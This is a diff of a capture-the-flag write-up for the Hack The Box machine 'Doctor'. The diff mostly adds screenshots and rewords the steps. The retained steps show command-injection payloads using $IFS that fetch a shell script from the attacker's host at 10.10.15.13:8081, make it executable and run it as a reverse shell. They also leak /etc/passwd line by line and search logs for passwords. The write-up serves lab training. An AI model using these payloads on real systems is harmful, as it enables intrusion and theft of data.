@@ -1,10 +1,18 @@
+---
+description: >-
+  Zweilosec's writeup on the easy-difficulty Linux machine Doctor from
+  https://hackthebox.eu
+---
+
 # HTB - Doctor
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/055d114fa0e4f23274338e658b73ae4b8e9a7b61/linux-machines/easy/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-doctor-infocard.png)
 
 Short description to include any strange things to be dealt with
+
+TODO: Finish writing and clean up
 
 ## Useful Skills and Tools
 
@@ -101,15 +109,23 @@ Only three ports open: 22 - SSH, 80 - HTTP, and 8089 - Splunk
 
 ### Port 80 - HTTP
 
+![](../../.gitbook/assets/1-http-doctor.png)
+
 on port 80 found Health Care website; contact information including domain info@doctors.htb
+
+![](../../.gitbook/assets/1-http-doctor-usernames.png)
 
 Further down the page found some potential usernames: Dr. Jade Guzman, Dr. Hannah Ford, Dr. James Wilson
 
 ### Port 8089 - Splunk
 
-Needed to use https. After accepting the security warnings about the self-signed certificates was led to a Splunk Atom Feed.
+![](../../.gitbook/assets/2-splunkd.png)
 
-Splunk build: 8.0.5
+Needed to use https. After accepting the security warnings about the self-signed certificates was led to a Splunk Atom Feed.  Says Splunk build: 8.0.5
+
+![](../../.gitbook/assets/2-splunkd-login.png)
+
+I tried clicking on the services link, but was prompted to enter credentials
 
 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
 
@@ -158,13 +174,41 @@ print("Thank you for using this service!\n")
 
 Brute force does not seem to get me anywhere
 
+![](../../.gitbook/assets/3-doctor-htb.png)
+
 Next I tried navigating to doctors.htb...and got redirected to a login page
+
+![](../../.gitbook/assets/3-doctor-htb2.png)
 
 Testing for SQLi gives me an error " Nope, no such luck. "
 
-found link to /archive in source code, this page is blank with no content
+![](../../.gitbook/assets/3-doctor-htb3-archive.png)
 
-While trying XSS testing in the message post there was an error that said the URL was not valid, but I still got a connection back
+found link to /archive in source code,
+
+![](../../.gitbook/assets/3-doctor-htb3-archive2.png)
+
+ this page is blank with no content
+
+![](../../.gitbook/assets/3-doctor-htb4-register.png)
+
+Registered for an account
+
+![](../../.gitbook/assets/3-doctor-htb4.png)
+
+After I created an account, I noticed a banner at the top of the page warning me that I would only have 20 minutes for it to live.
+
+![](../../.gitbook/assets/3-doctor-htb5-xsstest.png)
+
+I tried some basic tests for XSS
+
+![](../../.gitbook/assets/3-doctor-htb5-xsstest2.png)
+
+I could see my post, but no alert after I opened it.
+
+![](../../.gitbook/assets/3-doctor-htb5-xsstest3.png)
+
+I tried putting a link to my machine in the Content box, but got a message that the link I posted was not valid, but I still got a connection back to my machine
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
@@ -177,7 +221,9 @@ User-Agent: curl/7.68.0
 Accept: */*
 ```
 
-Looks like the service is running `curl`. If there is no input sanitization I may be able to get code execution here
+Looks like the service is running `curl`. If there is no input sanitization I may be able to get code execution here.
+
+![](../../.gitbook/assets/3-doctor-htb5-xsstest4.png)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
@@ -190,17 +236,21 @@ User-Agent: curl/7.68.0
 Accept: */*
 ```
 
-Putting in a command at the end of my URL results in a request with the `id` context information the service is running under
+Putting in a command at the end of my URL results in a request with the `id` context information the service is running under as the user `web`. 
 
-It seemed as if I couldn't use any commands with spaces, any commands I sent with spaces did not connect back
+I tried to do some of my normal enumeration such as `cat /etc/passwd`, but it seemed as if I couldn't use any commands with spaces.  Any commands I sent with spaces did not connect back to my machine.
 
-[https://www.betterhacker.com/2016/10/command-injection-without-spaces.html](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
+* [https://www.betterhacker.com/2016/10/command-injection-without-spaces.html](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
 
 Didn't work
 
-[https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
+* [https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
 
 in bash $IFS is a space by default
+
+![](../../.gitbook/assets/4-burp.png)
+
+After discovering that I could use commands by plugging the space with `$IFS`, I sent a lot of different commands trying to enumerate the machine.  \(As you can see below, I only got very limited information back from each attempt.\)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/doctor]
@@ -236,7 +286,15 @@ Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 10.10.10.209 - - [07/Feb/2021 21:46:42] "GET /shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash HTTP/1.1" 404 -
 ```
 
-figured out how to enumerate `/etc/passwd` one line at a time using `tail`; found a username `shaun`; next tried to see if I could send my SSH key to their `authorized_keys` file
+I figured out how to enumerate `/etc/passwd` one line at a time using `tail -n`;
+
+![](../../.gitbook/assets/4-wireshark.png)
+
+I hoped that perhaps I could see more of the output in Wireshark, but unfortunately I could not.
+
+![](../../.gitbook/assets/4-burp-shaun.png)
+
+ I found a username `shaun` using `tail -n2`.  Next, I tried to see if I could send my SSH key to `shaun`'s`authorized_keys` file but it didn't work.  After that I decided to try to get a reverse shell by sending a bash script and then executing it.
 
 ```bash
 #!/bin/bash
@@ -253,7 +311,23 @@ title=Passwd+Extract&content=http://10.10.15.13:8081/$(chmod$IFS'+x'$IFS'/dev/sh
 title=Passwd+Extract&content=http%3a//10.10.15.13%3a8081/$(bash$IFS'/dev/shm/shell')&submit=Post
 ```
 
-The three commands I sent through burp traffic: sending the file using curl, chmod +x to make executable, and executing my shell script
+The three commands I sent through burp traffic: 
+
+![](../../.gitbook/assets/5-burp-shell.png)
+
+sending the file using curl, 
+
+![](../../.gitbook/assets/5-shell.png)
+
+I verified that the file was there and accessible.
+
+![](../../.gitbook/assets/5-burp-shell2.png)
+
+chmod +x to make executable, 
+
+![](../../.gitbook/assets/5-burp-shell3.png)
+
+and executing my shell script
 
 ```text
 10.10.10.209 - - [07/Feb/2021 21:47:19] "GET /exim:x:31:31:Exim HTTP/1.1" 404 -                         
@@ -395,6 +469,8 @@ web@doctor:~$
 
 `adm` group can access process files and logs in /var/log
 
+![](../../.gitbook/assets/5-shell-pass.png)
+
 ```text
 web@doctor:/var/log$ grep password * 2>/dev/null
 grep password * 2>/dev/null
@@ -418,7 +494,9 @@ auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user s
 auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
 ```
 
-no passwords in these log files
+There were no useful hits for the word 'password' in these log files.
+
+![](../../.gitbook/assets/5-shell-pass-backup.png)
 
 ```text
 web@doctor:/var/log/apache2$ grep -i pass * 2>/dev/null
@@ -492,7 +570,7 @@ sudo -l
 Sorry, user shaun may not run sudo on doctor.
 ```
 
-However, now that I had credentials, I could potentially use the exploit for splunkd that I had found earlier
+Could not use `sudo` as this user.  However, now that I had credentials, I could potentially use the exploit for splunkd that I had found earlier...
 
 ```sql
 ┌──(zweilos㉿kali)-[~/htb/doctor]
@@ -523,9 +601,14 @@ INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog
 COMMIT;
 ```
 
-[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
+Found a password hash in the file `site.db`. I was unable to crack it with hashcat, however.
 
-Was able to use `shaun`'s credentials to log into the splunk site
+* [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) 
+* [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
+
+![](../../.gitbook/assets/6-splunk-login.png)
+
+Was able to use `shaun`'s credentials to log into `/services` page on the Splunk site.
 
 ### Getting a shell
 
@@ -603,9 +686,15 @@ Password found in: 0.26 seconds
 Thank you for using this service!
 ```
 
-Using my python brute force script it took roughly a quarter of a second per try. This would have taken over 154 hours to guess the correct password \(this is assuming single threaded attempts\). So, if the attacker had not been able to get a shell on the box as the web user and used the privilege escalation route, simply getting the username from /etc/passwd would have eventually provided access to a determined attacker!
+Using my python brute force script it took roughly a quarter of a second per try. 
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
+![](../../.gitbook/assets/brute-force_calc.png)
+
+This would have taken over 154 hours to guess the correct password \(this is assuming single threaded attempts\). So, if the attacker had not been able to get a shell on the box as the web user and used the privilege escalation route, simply getting the username from `/etc/passwd` would have eventually provided access to a determined attacker!
+
+![](../../.gitbook/assets/0-doctor-pwned.png)
+
+Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
